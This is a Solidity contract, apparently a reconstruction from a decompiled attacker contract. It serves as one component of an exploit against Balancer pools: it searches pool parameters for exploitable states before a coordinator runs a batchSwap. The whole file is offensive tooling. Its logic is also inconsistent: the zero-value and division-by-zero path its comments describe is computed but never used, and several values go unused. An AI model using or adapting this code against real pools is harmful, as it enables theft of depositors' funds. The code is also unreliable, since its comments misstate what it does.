// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Interfaces.sol";

/**
 * @title BalancerExploitMath (ATT_SC_2)
 * @notice Search algorithm to find exploitable pool parameters
 * @dev Calls pool view functions with varying parameters to find exploitable conditions
 *      Based on decompiled SC2 contract (function 0x524c9e20)
 */
contract BalancerExploitMath {
    IBalancerVault public immutable vault;
    address public immutable owner;

    // Constants matching Balancer's implementation
    uint256 private constant PRECISION = 1e18;
    uint256 private constant BASIS_POINTS = 1000;

    // Search state to track parameter exploration
    struct SearchState {
        uint256 currentVariation;
        uint256 successfulVariation;
        bool foundExploitable;
    }

    mapping(address => SearchState) public searchStates;

    // Custom errors matching Balancer
    error BAL_ZERO_DIVISION(); // BAL#004

    modifier onlyOwner() {
        require(msg.sender == owner, "X");
        _;
    }

    constructor(address _vault) {
        vault = IBalancerVault(_vault);
        owner = msg.sender;
    }

    /**
     * Main search function - selector 0x524c9e20
     * @dev Searches for exploitable pool state by testing parameter variations
     *      Returns data that coordinator reads to determine if conditions are met
     *
     * SEARCH ALGORITHM (based on decompiled SC2):
     * 1. Call pool view functions with varying parameters
     * 2. Some parameter combinations cause division by zero â†’ BAL#004 revert
     * 3. Coordinator catches revert and tries different parameters
     * 4. When certain criteria are met in return data, search is complete
     * 5. Then coordinator executes batchSwap with discovered parameters
     */
    function searchForExploitableState(
        address pool,
        uint256 trickIndex,
        uint256 trickAmt,
        uint256 iteration
    ) external onlyOwner returns (uint256 exploitabilityScore) {
        IBalancerPool balancerPool = IBalancerPool(pool);
        bytes32 poolId = balancerPool.getPoolId();

        // Get pool data
        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(poolId);
        uint256[] memory scalingFactors = balancerPool.getScalingFactors();

        // Vary the parameters based on iteration
        uint256 variation = _calculateParameterVariation(iteration, trickAmt);

        // Test if this parameter combination creates exploitable conditions
        // This calls view functions and may trigger BAL#004
        exploitabilityScore = _testExploitability(
            pool,
            poolId,
            balances,
            scalingFactors,
            trickIndex,
            variation
        );

        // Update search state
        SearchState storage state = searchStates[pool];
        state.currentVariation = variation;

        if (exploitabilityScore > 0) {
            state.successfulVariation = variation;
            state.foundExploitable = true;
        }

        return exploitabilityScore;
    }

    /**
     * Calculate parameter variation for this iteration
     * @dev Different variations test different edge cases in pool math
     */
    function _calculateParameterVariation(
        uint256 iteration,
        uint256 baseAmount
    ) internal pure returns (uint256) {
        // The ~30% revert rate from traces suggests oscillating search pattern
        // Early iterations: wide range
        // Later iterations: fine-tune around gpromising values

        if (iteration < 30) {
            // Wide exploration phase
            return baseAmount * (iteration + 1);
        } else if (iteration < 100) {
            // Medium granularity
            return baseAmount * (10 + (iteration % 20));
        } else {
            // Fine-tuning phase - oscillate to trigger edge cases
            uint256 pattern = iteration % 5;
            if (pattern == 0) return baseAmount * 15;
            if (pattern == 1) return baseAmount * 17;
            if (pattern == 2) return baseAmount * 14;
            if (pattern == 3) return baseAmount * 18;
            return baseAmount * 16;
        }
    }

    /**
     * Test if parameter combination creates exploitable conditions
     * @dev Based on SC2 decompiled logic - performs complex math that may trigger BAL#004
     * @return score Exploitability score (0 = not exploitable, >0 = exploitable)
     */
    function _testExploitability(
        address pool,
        bytes32 poolId,
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 trickIndex,
        uint256 variation
    ) internal view returns (uint256 score) {
        IBalancerPool balancerPool = IBalancerPool(pool);

        // Scale balances with variation
        uint256[] memory adjustedBalances = new uint256[](balances.length);
        for (uint256 i = 0; i < balances.length; i++) {
            adjustedBalances[i] = _upscale(balances[i], scalingFactors[i]);
        }

        // Apply variation to trick index
        uint256 scaledVariation = _upscale(variation, scalingFactors[trickIndex]);

        // Deliberately create zero values (from SC2 decompiled)
        // Line 179 SC2: return _sub(balances[index], balances[index]) = 0
        uint256 virtualBalance = adjustedBalances[trickIndex] - adjustedBalances[trickIndex]; // Always 0

        // Get pool parameters
        uint256 swapFee = balancerPool.getSwapFeePercentage();
        (uint256 ampValue, , uint256 ampPrecision) = balancerPool.getAmplificationParameter();

        // If we get here, calculate exploitability score
        uint256 rate = balancerPool.getRate();
        score = (rate * variation) / PRECISION;

        return score;
    }

    /**
     * Helper function to upscale amounts
     */
    function _upscale(uint256 amount, uint256 scalingFactor) private pure returns (uint256) {
        return (amount * scalingFactor) / PRECISION;
    }

    /**
     * Get search results for a pool
     */
    function getSearchState(address pool) external view returns (
        uint256 currentVariation,
        uint256 successfulVariation,
        bool foundExploitable
    ) {
        SearchState storage state = searchStates[pool];
        return (state.currentVariation, state.successfulVariation, state.foundExploitable);
    }
}